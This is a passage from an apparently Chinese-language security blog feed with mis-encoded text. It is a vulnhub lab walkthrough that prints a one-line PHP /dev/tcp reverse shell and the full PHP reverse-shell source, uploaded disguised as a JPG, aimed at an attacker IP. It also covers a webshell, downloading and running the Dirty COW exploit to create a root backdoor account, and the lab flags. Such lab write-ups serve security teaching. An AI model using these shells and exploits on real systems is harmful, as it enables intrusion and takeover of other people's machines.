ä¸ºlvvpç”¨äºåå‘è¿æ¥ï¼Œå¸¸ç”¨ï¼ˆç”¨äºè¿˜æœªæ‹¿åˆ°ä¸»æœºshellï¼‰</p><p>nvlpä¸ºç›‘å¬è¿æ¥ï¼Œç”¨äºå·²ç»æ‹¿ä¸‹ä¸»æœºçš„shellï¼Œå†åå¼¹shellï¼Œåˆ«ç”¨ï¼Œå¼¹ä¸å›æ¥ï¼Œå®³äºº</p></blockquote><p>ç›´æ¥åå¼¹shellï¼Œæ–‡ä»¶å†…å®¹æ”¹ä¸ºä¸‹åˆ—ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.101.128&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = 4444;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot; /bin/bash&quot;</span> ;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;&#123;<span class="variable">$shell</span>&#125; -i &gt;&amp; /dev/tcp/&#123;<span class="variable">$ip</span>&#125;/&#123;<span class="variable">$port</span>&#125; 0&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="built_in">exec</span> ( <span class="variable">$cmd</span> ) ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™ä¸ªé©¬å¼¹ä¸å›æ¥ï¼Œæ˜¯å› ä¸ºæ˜¯æ–‡ä»¶åŒ…å«çš„å—ï¼Œçœ‹åˆ°çš„å¸ˆå‚…ç»™ä¸ªç­”æ¡ˆ</p><p>ç”¨kaliè‡ªå¸¦çš„phpåå‘è¿æ¥é©¬ï¼Œè·¯å¾„åœ¨<code>/usr/share/webshells/php/php-reverse-shell.php</code>ï¼Œä¿®æ”¹ä¸€ä¸‹ipå’Œportï¼Œè½¬ä¸ºjpgä¸Šä¼ ï¼Œä¸Šä¼ ååŒ…å«ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.101.128&#x27;</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">4444</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line"><span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼¹å›shellï¼Œæƒé™ä¸ºwww-data</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626181105938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626181105938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½¿ç”¨pythonå¼¹å›æ ‡å‡†shellï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092501762.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092501762.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ–è€…ä¼ ä¸€å¥è¯é©¬ï¼Œèšå‰‘æ·»åŠ æ•°æ®ï¼Œå¹¶è®¾ç½®httpbodyä¸ºpostæ•°æ®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091025994.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091025994.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091040024.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091040024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>èšå‰‘è¿æ¥æˆåŠŸï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091335571.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091335571.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ï¼ˆ3ï¼‰è„ç‰›ææƒ"><a href="#ï¼ˆ3ï¼‰è„ç‰›ææƒ" class="headerlink" title="ï¼ˆ3ï¼‰è„ç‰›ææƒ"></a>ï¼ˆ3ï¼‰è„ç‰›ææƒ</h3><p><code>uname -a</code>å‘ç°linuxå†…æ ¸ä¸º2.6.35</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091730882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091730882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>è„ç‰›ææƒé€‚ç”¨çš„linux KernelèŒƒå›´</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.6.22 &lt;= Linux kernel &lt;= 3.9</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¯¥ææƒæ–¹å¼é€‚ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œåˆ°2016å¹´æ‰ä¿®å¤è¯¥æ¼æ´</p><p>å…ˆçœ‹ä¸€ä¸‹ç›®æ ‡æœºæœ‰æ— gcc:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br></pre></td></tr></table></figure><p>æœ‰gccï¼Œä¸”ç‰ˆæœ¬ä¸º4.6.3</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093520949.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093520949.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æ”»å‡»æœºå¼€å¯webæœåŠ¡ï¼Œåœ¨githubä¸Šä¸‹è½½è„ç‰›çš„expæˆ–è€…<code>searchsploit Dirty</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dirtycow exp:https://github.com/FireFart/dirtycow</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092620126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092620126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¤åˆ¶åˆ°æœ¬åœ°å¹¶ç”¨pythonå¼€å¯webæœåŠ¡(python2å’Œpython3ä¸ä¸€æ ·)ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/40839.c .</span><br><span class="line">python2 -m SimpleHttpServer 8000</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093353738.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093353738.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›®æ ‡æœºä¸Šä¸‹è½½expå¹¶è¿›è¡Œç¼–è¯‘ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.101.128:8000/40839.c</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ï¼Œæ˜¾ç¤ºè¯¥ç›®å½•æ— å†™æƒé™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093743542.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093743542.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è½¬åˆ°<code>/tmp</code>ç›®å½•é‡æ–°ä¸‹è½½ï¼Œä¸‹è½½æˆåŠŸï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093931310.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093931310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç¼–è¯‘æ‰§è¡Œï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure><blockquote><p>-pthread è¡¨ç¤ºå¯ç”¨POSIXçº¿ç¨‹åº“ï¼Œç”¨äºæ”¯æŒå¤šçº¿ç¨‹ç¼–ç¨‹</p><p>-o æŒ‡å®šç”Ÿæˆåçš„æ–‡ä»¶</p><p>-lcrypt è¿æ¥ctyptåº“ï¼Œç”¨äºæ”¯æŒå¯†ç åŠ å¯†ç®—æ³•</p></blockquote><p>æˆåŠŸç”Ÿæˆ&#x2F;tmp&#x2F;passwd.bakåé—¨ï¼Œå¹¶æç¤ºè¾“å…¥æ–°å¯†ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094407212.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094407212.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¾“å…¥è‡ªå·±æƒ³è¦çš„åé—¨å¯†ç ï¼Œå¯ä»¥ç”¨è¯¥è´¦æˆ·ç™»å½•äº†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094617075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094617075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>ç™»å½•ç‰¹æƒè´¦æˆ·ï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094719791.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094719791.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æŸ¥çœ‹æƒé™ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094745563.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094745563.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>åœ¨&#x2F;root&#x2F;root.txtæ‰¾åˆ°flag:</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094857813.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094857813.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>flag:&#x3D;&#x3D;8f420533b79076cc99e9f95a1a4e5568&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhubé¶æœºæ¸—é€RAVEN2</title>
      <link href="/2023/06/28/vulnhub-ba-ji-raven2/"/>
      <url>/2023/06/28/vulnhub-ba-ji-raven2/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>èµ„äº§ç¼–å·</th><th>èµ„äº§åˆ†ç±»</th><th>èµ„äº§åç§°</th><th>èµ„äº§è§„æ ¼</th><th>è®¿é—®åœ°å€</th><th>å¤‡æ³¨&#x2F;é—®é¢˜</th></tr></thead><tbody><tr><td>RAVEN1</td><td>ä¸»æœºç³»ç»Ÿ</td><td>Ubuntuæ“ä½œç³»ç»Ÿ</td><td>Type:Linux<br />IP:192.168.101.134<br />Port:22ã€80ã€111</td><td>192.168.101.134</td><td>æ•æ„Ÿç›®å½•æ³„éœ²ï¼ŒPHPMailerä½ç‰ˆæœ¬å‚æ•°æ³¨å…¥æ¼æ´ï¼ŒUDF+findå‘½ä»¤ææƒ</td></tr></tbody></table><p>é¶æœºflag:</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag2{6a8ed560f0b5358ecf844108048eb337}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag3{a0f568aa9de277887f37730d71520d9b}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag4{df2bc5e951d91581467bb9a2a8ff4425}&#x3D;&#x3D;</p><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/raven/Raven2.ova">https://download.vulnhub.com/raven/Raven2.ova</a></p><p>kaliæ”»å‡»æœºipä¸º192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="RAVEN-2é¶æœº"><a href="#RAVEN-2é¶æœº" class="headerlink" title="RAVEN 2é¶æœº"></a>RAVEN 2é¶æœº</h3><h3 id="ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†"><a href="#ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†" class="headerlink" 